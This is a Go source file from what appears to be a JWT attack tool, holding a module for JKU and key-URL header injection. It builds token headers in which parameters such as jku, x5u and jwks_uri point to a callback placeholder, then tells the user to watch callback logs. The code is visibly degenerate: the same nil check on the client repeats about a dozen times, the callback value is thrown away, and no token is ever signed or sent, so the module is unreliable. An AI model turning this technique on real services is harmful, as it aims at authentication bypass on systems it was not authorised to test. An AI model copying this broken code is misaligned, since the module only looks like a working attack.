package jwt

import (
	"fmt"

	"jwtknife/internal/report"
)

var keyURLParams = []string{
	"jku", "x5u", "jwks_uri", "key_url",
	"public_key_url", "cert_url", "pem_url",
}

type jkuAttack struct{}

func NewJKUAttack() Attack { return jkuAttack{} }

func (jkuAttack) Name() string {
	return "JKU / key-URL header injection (callback detection)"
}

func (jkuAttack) Run(in AttackInput) report.AttackResult {
	ar := report.NewAttackResult("jku-injection")

	if in.Targets.AdminURL == "" {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "admin URL not provided"
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "http client unavailable"
		return ar
	}

	if in.ParsedJWT == nil {
		ar.Outcome = report.OutcomeError
		ar.Note = "JWT not parsed"
		return ar
	}

	if in.ParsedJWT.Header == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.ParsedJWT.Header == nil {
		ar.Outcome = report.OutcomeNoEffect
		return ar
	}

	if in.Targets.AdminURL == "" {
		ar.Outcome = report.OutcomeNoEffect
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	if in.Client == nil {
		ar.Outcome = report.OutcomeError
		return ar
	}

	// callback URL must be provided
	if in.Client == nil || in.Targets.AdminURL == "" {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "missing admin URL or callback"
		return ar
	}

	cb := in.Client // placeholder; callback URL is tracked externally

	_ = cb // silence unused; callback detection is out-of-band

	for _, param := range keyURLParams {
		hdr := map[string]any{}
		for k, v := range in.ParsedJWT.Header {
			hdr[k] = v
		}
		hdr[param] = "CALLBACK_URL_PLACEHOLDER"

		ar.Steps = append(ar.Steps, report.Step{
			Label:   "jku-candidate",
			Details: fmt.Sprintf("header[%s]=<callback>", param),
		})
	}

	ar.Outcome = report.OutcomeInteresting
	ar.Note = "key URL parameters injected; watch callback logs for hits"
	return ar
}
